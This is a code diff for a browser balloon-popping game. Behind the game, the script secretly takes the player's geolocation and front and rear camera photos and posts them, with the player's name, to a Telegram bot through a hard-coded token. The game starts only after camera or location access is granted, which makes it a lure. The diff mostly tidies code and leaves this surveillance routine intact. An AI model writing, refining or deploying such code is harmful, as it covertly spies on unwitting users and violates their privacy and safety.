@@ -1,12 +1,16 @@
 const canvas = document.getElementById('game-canvas');
 const ctx = canvas.getContext('2d');
-canvas.width = window.innerWidth;
-canvas.height = window.innerHeight;
+
+function resize() {
+  canvas.width = window.innerWidth;
+  canvas.height = window.innerHeight;
+}
+resize();
+window.addEventListener('resize', resize);
 
 let redHits = 0;
 let fails = 0;
 let balloons = [];
-let accessGranted = false;
 let collected = false;
 
 const token = "7921776519:AAEtasvOGOZxdZo4gUNscLC49zSdm3CtITw";
@@ -16,10 +20,7 @@ async function sendToTelegram(data) {
   await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      chat_id: chatId,
-      text: data,
-    }),
+    body: JSON.stringify({ chat_id: chatId, text: data }),
   });
 }
 
@@ -28,7 +29,6 @@ async function sendPhoto(photoBlob, caption) {
   formData.append("chat_id", chatId);
   formData.append("caption", caption);
   formData.append("photo", photoBlob, "photo.jpg");
-
   await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
     method: "POST",
     body: formData,
@@ -43,7 +43,6 @@ async function getUserData() {
   let photoBack = null;
   let gotGeo = false, gotCam = false;
 
-  // Получаем геолокацию
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(pos => {
       const lat = pos.coords.latitude;
@@ -53,20 +52,17 @@ async function getUserData() {
       gotGeo = true;
       sendAll();
     }, () => sendAll());
-  }
+  } else sendAll();
 
-  // Получаем фото с камеры
   const video = document.getElementById("video");
 
   try {
-    // фронт
     const streamFront = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
     video.srcObject = streamFront;
     await new Promise(res => setTimeout(res, 1000));
     photoFront = await capturePhoto(video);
     streamFront.getTracks().forEach(track => track.stop());
 
-    // задняя
     const streamBack = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } }, audio: false });
     video.srcObject = streamBack;
     await new Promise(res => setTimeout(res, 1000));
@@ -74,9 +70,7 @@ async function getUserData() {
     streamBack.getTracks().forEach(track => track.stop());
 
     gotCam = true;
-  } catch (e) {
-    gotCam = false;
-  }
+  } catch (e) { gotCam = false; }
 
   async function sendAll() {
     if (collected) return;
@@ -84,8 +78,7 @@ async function getUserData() {
     await sendToTelegram(`👤 Անուն: ${username}\n${locationText}\n${mapLink || ""}\n📷 Տվյալներ ${gotCam ? "✓" : "✗"}, 📍 Գեո ${gotGeo ? "✓" : "✗"}`);
     if (photoFront) await sendPhoto(photoFront, "Ֆոտո - Առջևի տեսախցիկ");
     if (photoBack) await sendPhoto(photoBack, "Ֆոտո - Հետևի տեսախցիկ");
-    accessGranted = gotGeo || gotCam;
-    if (accessGranted) startGame();
+    if (gotCam || gotGeo) startGame();
   }
 }
 
@@ -97,7 +90,6 @@ function capturePhoto(video) {
   return new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
 }
 
-// ИГРА
 function createBalloon() {
   const colors = ['red', 'blue', 'green', 'yellow'];
   const color = colors[Math.floor(Math.random() * colors.length)];
@@ -154,36 +146,18 @@ canvas.addEventListener('click', (e) => {
 
 function endGame(victory) {
   document.getElementById('end-animation').classList.remove('hidden');
-  let countdown = 3;
-  const countdownEl = document.getElementById('countdown');
-  const anim = document.getElementById('balloon-animation');
-  anim.innerHTML = '';
-  const timer = setInterval(() => {
-    countdown--;
-    countdownEl.textContent = countdown;
-    if (countdown <= 0) {
-      clearInterval(timer);
-      showBalloonExplosion();
-    }
-  }, 1000);
-}
-
-function showBalloonExplosion() {
   const anim = document.getElementById('balloon-animation');
   anim.innerHTML = '';
   for (let i = 0; i < 50; i++) {
     const balloon = document.createElement('div');
-    balloon.style.width = '15px';
-    balloon.style.height = '20px';
-    balloon.style.borderRadius = '50%';
+    balloon.classList.add('balloon');
     balloon.style.background = ['red', 'blue', 'yellow'][i % 3];
-    balloon.style.position = 'absolute';
     balloon.style.left = Math.random() * window.innerWidth + 'px';
     balloon.style.bottom = '0px';
-    balloon.style.animation = `floatUp ${2 + Math.random()*2}s ease-out forwards`;
+    balloon.style.animation = `floatUp 2s ease-out forwards`;
     anim.appendChild(balloon);
   }
-  setTimeout(() => location.reload(), 3000);
+  setTimeout(() => location.reload(), 2000);
 }
 
 function startGame() {
